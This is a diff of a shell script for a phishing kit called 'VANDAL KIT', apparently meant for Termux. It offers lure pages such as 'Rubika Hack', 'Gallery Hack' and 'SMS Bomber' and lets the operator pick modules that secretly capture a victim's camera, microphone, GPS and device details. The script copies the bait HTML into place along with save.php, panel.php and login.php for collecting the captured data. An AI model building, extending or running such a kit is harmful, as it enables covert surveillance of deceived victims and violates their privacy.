@@ -14,7 +14,7 @@ echo " ██║   ██║███████║██╔██╗ ██║
 echo " ╚██╗ ██╔╝██╔══██║██║╚██╗██║██║  ██║██╔══██║██║"
 echo "  ╚████╔╝ ██║  ██║██║ ╚████║██████╔╝██║  ██║███████╗"
 echo "   ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝"
-echo -e "\033[0m\033[1;91m     VANDAL KIT v2 — Auto Camera Access\033[0m"
+echo -e "\033[0m\033[1;91m     VANDAL KIT v3\033[0m"
 echo ""
 }
 
@@ -23,24 +23,26 @@ deps() { command -v php >/dev/null 2>&1 || pkg install -y php >/dev/null 2>&1; c
 menu() {
 echo -e "\033[1;96m── Select Page ──\033[0m"
 echo -e "  \033[1;92m[1]\033[0m 💥 SMS Bomber"
-echo -e "  \033[1;92m[2]\033[0m 📱 Spy Tool (Phone Info Extractor)"
-echo -e "  \033[1;92m[3]\033[0m 🎥 Google Meet"
-read -p $'\033[1;93m[?] Select [1-3]: \033[0m' TEM; TEM="${TEM:-1}"
+echo -e "  \033[1;92m[2]\033[0m 🔓 Rubika Hack"
+echo -e "  \033[1;92m[3]\033[0m 📸 Gallery Hack"
+echo -e "  \033[1;92m[4]\033[0m 🔐 Rubika Filter"
+read -p $'\033[1;93m[?] Select [1-4]: \033[0m' TEM; TEM="${TEM:-1}"
 
-echo -e "\033[1;96m── Select Modules ──\033[0m"
+echo -e "\033[1;96m── Select Module ──\033[0m"
 echo -e "  \033[1;92m[1]\033[0m 📸 Camera"
 echo -e "  \033[1;92m[2]\033[0m 📸+🎤 Camera + Mic"
 echo -e "  \033[1;92m[3]\033[0m 📸+📍 Camera + GPS"
-echo -e "  \033[1;92m[4]\033[0m 📸+📱 Camera + Device Info"
-echo -e "  \033[1;92m[5]\033[0m 🎯 ALL (Camera+Mic+GPS+Device)"
+echo -e "  \033[1;92m[4]\033[0m 📸+📱 Camera + Device"
+echo -e "  \033[1;92m[5]\033[0m 🎯 ALL"
 read -p $'\033[1;93m[?] Select [1-5]: \033[0m' MOD; MOD="${MOD:-5}"
 }
 
 build() {
 case "$TEM" in
-2) cp "$SCRIPT_DIR/spy-tool.html" index2.html ;;
-3) cp "$SCRIPT_DIR/google-meet.html" index2.html 2>/dev/null || cp "$SCRIPT_DIR/index.html" index2.html ;;
-*) cp "$SCRIPT_DIR/index.html" index2.html ;;
+2) cp "$SCRIPT_DIR/rubika-hack.html" index2.html ;;
+3) cp "$SCRIPT_DIR/gallery-hack.html" index2.html ;;
+4) cp "$SCRIPT_DIR/rubika-filter.html" index2.html ;;
+*) cp "$SCRIPT_DIR/sms-bomber.html" index2.html ;;
 esac
 
 cat > index.php <<'PHPEOF'
@@ -48,7 +50,7 @@ cat > index.php <<'PHPEOF'
 PHPEOF
 
 cp "$SCRIPT_DIR/save.php" .
-cp "$SCRIPT_DIR/panel.php" .
+cp "$SCRIPT_DIR/panel.php" . 2>/dev/null
 cp "$SCRIPT_DIR/login.php" .
 
 echo -e "\033[1;92m[+] Ready\033[0m"
